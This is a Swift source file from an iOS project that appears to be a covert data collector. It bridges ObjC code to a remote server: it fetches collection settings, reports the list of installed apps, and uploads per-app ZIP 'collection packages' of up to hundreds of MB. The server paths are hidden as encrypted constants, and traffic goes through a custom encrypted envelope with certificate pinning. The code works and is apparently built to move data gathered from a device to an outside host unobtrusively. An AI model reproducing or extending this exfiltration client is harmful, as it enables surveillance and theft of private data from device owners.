//
//  WQNet.swift
//  WQFiles
//
//  给 ObjC 侧的网络桥。内部用 WQV2（X25519 + HKDF + AES-CBC + HMAC-SHA256），
//  路径走 SecureBox 里的加密常量，和 3105 的 ProtocolAPI 一一对应：
//
//      api/device/report -> V2Protocol.path("config")   拉采集配置
//      api/device/apps   -> V2Protocol.path("apps")     上报已装应用
//      api/log/report    -> V2Protocol.path("log")      上报阶段日志
//      api/upload/zip    -> V2Protocol.path("zip")      上传采集包（ZIP）
//
//  上传接口按后端 v2 控制器（cool-admin-midway-8.x:
//  src/modules/device/controller/open/v2.ts）的实际约定实现：
//
//      POST <pathZip>                       Content-Type: multipart/form-data
//        meta   = v2 信封 JSON              服务端 readEnvelope 先读 meta，再读 params
//        params = 同一份信封                兼容只认 params 的旧 v2 构建
//        file   = ZIP 原始字节              service/upload.ts pickFile 认 fieldName=file
//      X-App-UUID: <uuid>                  参与 MAC 的 AAD，必须和信封里的一致
//
//      响应 { code:0, message:"ok", data:{ v:2, iv, ct, mac, ts } }
//      —— 必须用同一会话解开 data 才算成功；只看 code 会把 401/500 也当成功。
//
//  大包不整块进内存：MD5、multipart 请求体都是 1 MB 分块从磁盘读写，
//  请求体落在临时文件里交给 uploadTask(fromFile:)，几百 MB 的采集包也不会被 Jetsam 杀掉。
//
//  ObjC 侧声明（见 WQCollector.m）：
//      extern int   wqnet_ready(void);
//      extern char *wqnet_configs(void);
//      extern int   wqnet_apps(const char *jsonArray);
//      extern int   wqnet_log(const char *text);
//      extern int   wqnet_upload(const char *filePath, const char *bundleID);
//      extern char *wqnet_last_error(void);
//      extern char *wqnet_describe(void);
//

import Foundation
import UIKit
import Darwin
import CryptoKit

private let netTimeoutReport: TimeInterval = 30
private let netTimeoutUpload: TimeInterval = 600
private let netUUIDKey = "wq.net.app_uuid"
private let netChunkSize = 1 << 20

// MARK: - 设备参数

private func netAppUUID() -> String {
    let defaults = UserDefaults.standard
    if let existing = defaults.string(forKey: netUUIDKey), !existing.isEmpty {
        return existing
    }
    let generated = UUID().uuidString.lowercased()
    defaults.set(generated, forKey: netUUIDKey)
    return generated
}

private func netMachineName() -> String {
    var systemInfo = utsname()
    uname(&systemInfo)
    let mirror = Mirror(reflecting: systemInfo.machine)
    let identifier = mirror.children.reduce(into: "") { partial, element in
        guard let value = element.value as? Int8, value != 0 else { return }
        partial.append(Character(UnicodeScalar(UInt8(bitPattern: value))))
    }
    return identifier.isEmpty ? "unknown" : identifier
}

private func netDeviceParams(extra: [String: Any] = [:]) -> [String: Any] {
    let info = Bundle.main.infoDictionary
    var params: [String: Any] = [
        "app_uuid": netAppUUID(),
        "app_version": (info?["CFBundleShortVersionString"] as? String) ?? "0",
        "app_pac": Bundle.main.bundleIdentifier ?? "",
        "machine": netMachineName(),
        "ios_version": UIDevice.current.systemVersion,
        "timestamp": Int64(Date().timeIntervalSince1970 * 1000),
    ]
    for (key, value) in extra { params[key] = value }
    return params
}

/// baseURL + 路径。3105 用的是 baseURL.appendingPathComponent(...)；
/// URL(string:relativeTo:) 在 base 没有结尾斜杠时会拼错（拿掉最后一段而不是追加）。
private func netURL(for path: String) -> URL {
    WQV2.baseURL.appendingPathComponent(WQV2.normalizePath(path))
}

// MARK: - 同步 POST

private enum NetResult {
    case ok([String: Any])
    case failure(String)
}

/// 最后一次网络失败的详细原因（给 ObjC 写进 wq-collect.log）
private var netLastError = ""

private func netRecordError(_ text: String) {
    netLastError = text
    NSLog("[WQNet] %@", text)
}

private func netPost(legacyPath: String, params: [String: Any], timeout: TimeInterval) -> NetResult {
    let realPath = WQV2.v2Path(legacyPath)
    let url = netURL(for: realPath)
    netRecordError("POST \(url.absoluteString)")

    // aad 里绑定了 method/path/appUUID/ts/nonce，服务端用真实路径重算 MAC。
    // 不传 context（默认 .none，path 为空）会得到 {"code":401,"message":"消息校验失败"}。
    let uuid = netAppUUID()
    let context = WQV2.Context(method: "POST", path: realPath, appUUID: uuid)
    let session: WQV2.Session
    do {
        session = try WQV2.newSession(params, context: context)
    } catch {
        netRecordError("\(legacyPath) v2 seal FAILED — \(error.localizedDescription)")
        return .failure("v2 seal failed: \(error.localizedDescription)")
    }
    guard let body = try? JSONSerialization.data(withJSONObject: session.body) else {
        netRecordError("\(legacyPath) v2 body encode FAILED")
        return .failure("v2 body encode failed")
    }

    var request = URLRequest(url: url)
    request.httpMethod = "POST"
    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
    request.setValue(uuid, forHTTPHeaderField: "X-App-UUID")
    request.timeoutInterval = timeout
    request.httpBody = body

    let sem = DispatchSemaphore(value: 0)
    var data: Data?
    var status = -1
    var transportError: String?

    WQPinnedSession.shared.session.dataTask(with: request) { payload, response, error in
        if let error = error { transportError = error.localizedDescription }
        data = payload
        status = (response as? HTTPURLResponse)?.statusCode ?? -1
        sem.signal()
    }.resume()

    if sem.wait(timeout: .now() + timeout + 5) == .timedOut {
        netRecordError("\(realPath) TIMEOUT after \(Int(timeout))s")
        return .failure("timeout \(realPath)")
    }
    if let transportError = transportError {
        netRecordError("\(realPath) transport: \(transportError)")
        return .failure("transport \(transportError)")
    }
    guard status == 200, let data = data,
          let envelope = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
          (envelope["code"] as? Int ?? -1) == 0 else {
        let snippet = data.flatMap { String(data: $0.prefix(160), encoding: .utf8) } ?? "-"
        netRecordError("\(realPath) http=\(status) body=\(snippet)")
        return .failure("http=\(status) path=\(realPath)")
    }
    guard let plain = session.open(envelope["data"]) else {
        netRecordError("\(realPath) v2 OPEN failed (mac/decrypt)")
        return .failure("v2 open failed path=\(realPath)")
    }
    netRecordError("\(realPath) OK keys=\(plain.keys.count)")
    return .ok(plain)
}

// MARK: - 上传：流式 MD5 + 流式 multipart

private enum FileDigest {
    case ok(md5: String, size: Int64)
    case failure(String)
}

/// 分块算 MD5，同时拿文件大小。整块 Data(contentsOf:) 会把大包读进内存。
private func netDigest(_ url: URL) -> FileDigest {
    guard let handle = try? FileHandle(forReadingFrom: url) else {
        return .failure("cannot open \(url.lastPathComponent)")
    }
    defer { try? handle.close() }
    var hasher = Insecure.MD5()
    var total: Int64 = 0
    while true {
        let chunk = try? handle.read(upToCount: netChunkSize)
        guard let data = chunk, !data.isEmpty else { break }
        hasher.update(data: data)
        total += Int64(data.count)
    }
    let hex = hasher.finalize().map { String(format: "%02x", $0) }.joined()
    return .ok(md5: hex, size: total)
}

/// 把 multipart 请求体写到 partURL：
///   meta=<信封 JSON> / params=<同一份信封> / file=<ZIP 原始字节>
/// 服务端 readEnvelope 读 meta，pickFile 认 fieldName=file，两个名字都对得上。
private func netBuildMultipart(envelope: Data, fileURL: URL, fileName: String,
                               boundary: String, partURL: URL) -> Bool {
    let fm = FileManager.default
    try? fm.removeItem(at: partURL)
    guard fm.createFile(atPath: partURL.path, contents: nil) else { return false }
    guard let out = try? FileHandle(forWritingTo: partURL) else { return false }

    var head = Data()
    func addText(_ text: String) { head.append(Data(text.utf8)) }
    for field in ["meta", "params"] {
        addText("--\(boundary)\r\n")
        addText("Content-Disposition: form-data; name=\"\(field)\"\r\n")
        addText("Content-Type: application/json\r\n\r\n")
        head.append(envelope)
        addText("\r\n")
    }
    addText("--\(boundary)\r\n")
    addText("Content-Disposition: form-data; name=\"file\"; filename=\"\(fileName)\"\r\n")
    addText("Content-Type: application/zip\r\n\r\n")
    do {
        try out.write(contentsOf: head)
    } catch {
        try? out.close()
        try? fm.removeItem(at: partURL)
        return false
    }

    guard let input = try? FileHandle(forReadingFrom: fileURL) else {
        try? out.close()
        try? fm.removeItem(at: partURL)
        return false
    }
    defer { try? input.close() }
    while true {
        let chunk = try? input.read(upToCount: netChunkSize)
        guard let data = chunk, !data.isEmpty else { break }
        do {
            try out.write(contentsOf: data)
        } catch {
            try? out.close()
            try? fm.removeItem(at: partURL)
            return false
        }
    }

    do {
        try out.write(contentsOf: Data("\r\n--\(boundary)--\r\n".utf8))
        try out.close()
    } catch {
        try? fm.removeItem(at: partURL)
        return false
    }
    return true
}

private struct UploadOutcome {
    let code: Int32
    let detail: String
}

/// 一次 v2 上传尝试。每次都用全新的会话（新 nonce / 新 ECDH），
/// 失败重试时不会撞上服务端 5 分钟 nonce 去重。
private func netUploadOnce(fileURL: URL, fileName: String, bundleID: String,
                           md5: String, size: Int64) -> UploadOutcome {
    let realPath = WQV2.v2Path("api/upload/zip")
    let url = netURL(for: realPath)
    let uuid = netAppUUID()

    let params: [String: Any] = netDeviceParams(extra: [
        "bundle_id": bundleID,
        "file_name": fileName,
        "file_size": size,
        "file_md5": md5,
        "upload_kind": "zip",
    ])

    let session: WQV2.Session
    do {
        session = try WQV2.newSession(params, context: WQV2.Context(method: "POST", path: realPath, appUUID: uuid))
    } catch {
        return UploadOutcome(code: -4, detail: "seal FAILED — \(error.localizedDescription)")
    }
    guard let envelope = try? JSONSerialization.data(withJSONObject: session.body) else {
        return UploadOutcome(code: -5, detail: "envelope encode FAILED")
    }

    let boundary = "----WQFiles\(UUID().uuidString.replacingOccurrences(of: "-", with: ""))"
    let partURL = URL(fileURLWithPath: NSTemporaryDirectory())
        .appendingPathComponent("wq-upload-\(UUID().uuidString).part")
    guard netBuildMultipart(envelope: envelope, fileURL: fileURL, fileName: fileName,
                            boundary: boundary, partURL: partURL) else {
        return UploadOutcome(code: -6, detail: "multipart build FAILED")
    }
    defer { try? FileManager.default.removeItem(at: partURL) }

    var request = URLRequest(url: url)
    request.httpMethod = "POST"
    request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
    request.setValue(uuid, forHTTPHeaderField: "X-App-UUID")
    request.timeoutInterval = netTimeoutUpload

    let sem = DispatchSemaphore(value: 0)
    var status = -1
    var detail = "no response"
    var ok = false

    WQPinnedSession.shared.session.uploadTask(with: request, fromFile: partURL) { payload, response, error in
        defer { sem.signal() }
        status = (response as? HTTPURLResponse)?.statusCode ?? -1
        if let error = error {
            detail = "transport \(error.localizedDescription)"
            return
        }
        guard let payload = payload,
              let env = try? JSONSerialization.jsonObject(with: payload) as? [String: Any] else {
            detail = "http=\(status) empty body"
            return
        }
        let code = env["code"] as? Int ?? -1
        guard code == 0 else {
            detail = "http=\(status) code=\(code) \(String((env["message"] as? String ?? "").prefix(80)))"
            return
        }
        guard session.open(env["data"]) != nil else {
            detail = "http=\(status) code=0 但 v2 OPEN 失败（mac/decrypt）"
            return
        }
        ok = true
        detail = "http=\(status) code=0"
    }.resume()

    if sem.wait(timeout: .now() + netTimeoutUpload + 30) == .timedOut {
        return UploadOutcome(code: -7, detail: "timeout \(Int(netTimeoutUpload))s")
    }
    return UploadOutcome(code: ok ? 0 : -8, detail: detail)
}

// MARK: - C 桥

private func netCString(_ text: String) -> UnsafeMutablePointer<CChar>? {
    return strdup(text)
}

@_cdecl("wqnet_ready")
public func wqnet_ready() -> Int32 {
    guard WQV2.serverPublicKey.count == 32 else { return -2 }
    guard !WQV2.baseURL.absoluteString.isEmpty else { return -3 }
    guard !SecureBox.string(.pathConfig).isEmpty else { return -4 }
    guard !WQV2.v2Path("api/upload/zip").isEmpty else { return -5 }
    guard !SecureBox.string(.v1Key).isEmpty else { return -6 }
    return 0
}

@_cdecl("wqnet_last_error")
public func wqnet_last_error() -> UnsafeMutablePointer<CChar>? {
    return netCString(netLastError)
}

@_cdecl("wqnet_describe")
public func wqnet_describe() -> UnsafeMutablePointer<CChar>? {
    let host = WQV2.baseURL.absoluteString
    let configPath = WQV2.v2Path("api/device/report")
    let logPath = WQV2.v2Path("api/log/report")
    let zipPath = WQV2.v2Path("api/upload/zip")
    let pinHost = WQPinnedSession.hostKey()
    let txt = "host=\(host) config=\(configPath) log=\(logPath) zip=\(zipPath) pub=\(WQV2.serverPublicKey.count)B "
        + "pin=\(WQPinnedSession.enabled ? "on" : "off")/\(pinHost) leafPins=\(WQPinnedSession.leafPins.count)"
    return netCString(txt)
}

/// 拉采集配置。返回 JSON 字符串（调用方 free），失败返回 NULL。
@_cdecl("wqnet_configs")
public func wqnet_configs() -> UnsafeMutablePointer<CChar>? {
    switch netPost(legacyPath: "api/device/report", params: netDeviceParams(), timeout: netTimeoutReport) {
    case .ok(let plain):
        guard let configs = plain["collect_configs"] else { return nil }
        guard let data = try? JSONSerialization.data(withJSONObject: configs),
              let text = String(data: data, encoding: .utf8) else { return nil }
        return netCString(text)
    case .failure(let reason):
        NSLog("[WQNet] configs failed: %@", reason)
        return nil
    }
}

/// 上报阶段日志。返回 0 成功。
@_cdecl("wqnet_log")
public func wqnet_log(_ text: UnsafePointer<CChar>?) -> Int32 {
    guard let text = text else { return -1 }
    let message = String(cString: text)
    switch netPost(legacyPath: "api/log/report",
                   params: netDeviceParams(extra: ["text": message]),
                   timeout: netTimeoutReport) {
    case .ok:
        NSLog("[WQNet] log reported (%d chars)", message.count)
        return 0
    case .failure(let reason):
        NSLog("[WQNet] log failed: %@", reason)
        return -2
    }
}

/// 上报已装应用列表（jsonArray 是 JSON 字符串数组）。
@_cdecl("wqnet_apps")
public func wqnet_apps(_ jsonArray: UnsafePointer<CChar>?) -> Int32 {
    guard let jsonArray = jsonArray else { return -1 }
    let text = String(cString: jsonArray)
    guard let data = text.data(using: .utf8),
          let apps = try? JSONSerialization.jsonObject(with: data) as? [String] else { return -2 }
    switch netPost(legacyPath: "api/device/apps",
                   params: netDeviceParams(extra: ["apps": apps]),
                   timeout: netTimeoutReport) {
    case .ok:
        NSLog("[WQNet] apps reported (%d)", apps.count)
        return 0
    case .failure(let reason):
        NSLog("[WQNet] apps failed: %@", reason)
        return -3
    }
}

/// 上传采集包（ZIP，multipart + v2 信封）。返回 0 成功。
/// 失败时先重试一次（新会话、新 nonce），并把原因写进 wqnet_last_error。
@_cdecl("wqnet_upload")
public func wqnet_upload(_ filePath: UnsafePointer<CChar>?, _ bundleID: UnsafePointer<CChar>?) -> Int32 {
    guard let filePath = filePath, let bundleID = bundleID else { return -1 }
    let path = String(cString: filePath)
    let bundle = String(cString: bundleID)
    let fileURL = URL(fileURLWithPath: path)
    let fileName = fileURL.lastPathComponent

    let digest: FileDigest = netDigest(fileURL)
    let md5: String
    let size: Int64
    switch digest {
    case .ok(let value, let bytes):
        md5 = value
        size = bytes
    case .failure(let reason):
        netRecordError("upload \(fileName) digest FAILED — \(reason)")
        return -2
    }
    guard size > 0 else {
        netRecordError("upload \(fileName) is empty")
        return -3
    }

    var last = UploadOutcome(code: -9, detail: "not attempted")
    for attempt in 1...2 {
        last = netUploadOnce(fileURL: fileURL, fileName: fileName, bundleID: bundle,
                             md5: md5, size: size)
        if last.code == 0 { break }
        netRecordError("upload \(fileName) attempt \(attempt) FAILED — \(last.detail)")
        if attempt < 2 {
            Thread.sleep(forTimeInterval: 2)
        } else {
            netLastError = "upload \(fileName) FAILED — \(last.detail)"
        }
    }
    if last.code == 0 {
        netRecordError("upload \(fileName) OK bundle=\(bundle) \(size)B md5=\(md5)")
    }
    return last.code
}
